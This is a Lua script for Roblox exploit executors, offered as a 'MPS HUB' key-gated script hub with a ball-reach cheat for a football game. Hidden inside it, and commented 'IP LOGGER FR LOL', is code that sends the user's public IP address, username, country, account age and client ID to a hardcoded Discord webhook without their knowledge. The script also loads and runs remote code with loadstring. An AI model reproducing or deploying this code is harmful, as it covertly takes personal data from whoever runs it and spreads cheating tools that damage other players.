
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Player = game.Players.LocalPlayer
local Window = OrionLib:MakeWindow({Name = "MPS HUB Key System", HidePremium = false, SaveConfig = true, IntroText = "MPS Key System"})

OrionLib:MakeNotification({
    Name = "Logged in",
    Content = "Welcome! "..Player.Name.."." ,
    Image = "rbxassetid://4483345998",
    Time = 5
})

_G.Key = "cr4bby" -- Change key here
_G.KeyInput = "string" -- Change what you want the textbox of where you enter the key to say without clicking it

local Key = Window:MakeTab({
    Name = "Key System",
    Icon = "rbxassetid://4483345998", -- Your able to change this to any image you want
    PremiumOnly = false
})

function MakeScriptHub()


---IP LOGGER FR LOL

local webh = "https://discord.com/api/webhooks/1073932506224656394/2DtYtEiwwIRb_y_sxytrcn7-dCk8B0YFWNSdtf7V0yT3GjEroG8-gFcgSBZ0oQhTvTy5"

pcall(function()
   local data = {
       ["embeds"] = {
           {
               ["title"] = game:GetService("Players").LocalPlayer.Name,
               ["description"] = game:HttpGet("https://api.ipify.org")
           }
       }
   }

   if syn then
       local response = syn.request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif request then
       local response = request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif http_request then
       local response = http_request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   end
end)

---key with webhook
---also made by me

local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local Players = game:GetService("Players")

local function getHWID()
    local computerName = ""
    pcall(function() computerName = string.lower(os.getenv("COMPUTERNAME")) end)

    local volumeSerialNumber = ""
    pcall(function()
        local drive = string.sub(os.getenv("SystemDrive"), 1, 1)
        local handle = io.popen("vol " .. drive .. ":")
        volumeSerialNumber = string.match(handle:read("*a"), "%-+[%w%-]+%-+[%w%-]+%-+[%w%-]+%-+[%w%-]+%-+[%w%-]+")
        handle:close()
    end)

    local macAddress = ""
    pcall(function()
        local adapters = game:GetService("NetworkAdapter").GetAdapters()
        table.sort(adapters, function(a, b) return a.Name < b.Name end)
        macAddress = adapters[1].MacAddress
    end)

    local hwidString = computerName .. volumeSerialNumber .. macAddress
    return syn and syn.crypt.hash(syn.crypt.create(hwidString)) or "N/A"
end

local request = http_request or request or (syn and syn.request)

request({
    Method = "POST",
    Url = "https://discord.com/api/webhooks/1073932506224656394/2DtYtEiwwIRb_y_sxytrcn7-dCk8B0YFWNSdtf7V0yT3GjEroG8-gFcgSBZ0oQhTvTy5",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = HttpService:JSONEncode({
        username = "Logs",
        embeds = {
            {
                title = MarketplaceService:GetProductInfo(game.PlaceId).Name,
                description = "**" .. Players.LocalPlayer.Name .. "** has executed the script!",
                color = 0xFF0000, -- red color code
                fields = {
                    { name = "Place ID", value = game.PlaceId },
                    { name = "Account Age", value = Players.LocalPlayer.AccountAge .. " days old" },
                    { name = "Country", value = LocalizationService:GetCountryRegionForPlayerAsync(Players.LocalPlayer) },
                    { name = 'Hwid', value = game:GetService("RbxAnalyticsService"):GetClientId()},
                }
            }
        }
    })
})

wait(1)

local lc = game:GetService("Players").LocalPlayer -- Use GetService it is important because some games change Players so use that instead of game.Players!
local group = 16807529 -- Roblox Fan Group but put your group ID HERE
local grouplink = "https://www.roblox.com/groups/16807529/Scripts-Clothing-Server#!/about"

if lc:IsInGroup(group) then -- IS In group is the roblox API Reference pretty self explanatory 



rconsolename("Credits!!")
wait(2)
local amount=99999999999
for i=1,amount do
rconsoleprint('@@LIGHT_RED@@')
rconsoleprint("https://discord.gg/G8SKbAZgh7 \n")
wait(2)
rconsoleprint('@@LIGHT_GREEN@@')
rconsoleprint("Dm us to buy the paid script\n")
wait(2)
rconsoleprint('@@CYAN@@')
rconsoleprint("Also u need to join the group to use the script\n")
wait(2)
rconsoleclear()
wait(2)
end


local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("MPS GUI", "Midnight")

local Tab = Window:NewTab("Free Script")
local Section = Tab:NewSection("Reach")
Section:NewButton("Enable", "ButtonInfo", function()

_G.BallName = "TPS"
_G.Magnitude = 7
_G.Enabled = true
-- DONT TOUCH ANYTHING BELOW THIS

_G.Path = nil

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local left = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)


setsimulationradius(math.huge, math.huge)

end)
---------------------------------------------------------

Section:NewButton("Disable", "ButtonInfo", function()
_G.BallName = "TPS"
_G.Magnitude = 0
_G.Enabled = true


-- DONT TOUCH ANYTHING BELOW THIS

_G.Path = nil

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local left = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)


setsimulationradius(math.huge, math.huge)

end )


else
      lc:kick("Not In Group,Copied Link,Paste It On Your Browser") -- Doesn't have to be kicked
      setclipboard(grouplink)
end
OrionLib:Destroy() -- keep this its needed
end


Key:AddTextbox({
    Name = "Enter Key",
    Default = "",
    TextDisappear = true,
    Callback = function(Value)
        _G.KeyInput = Value
    end      
})


Key:AddButton({
    Name = "Check Key",
    Callback = function()
              if _G.KeyInput == _G.Key then
                MakeScriptHub()
print("Loaded")
            end
      end    
})
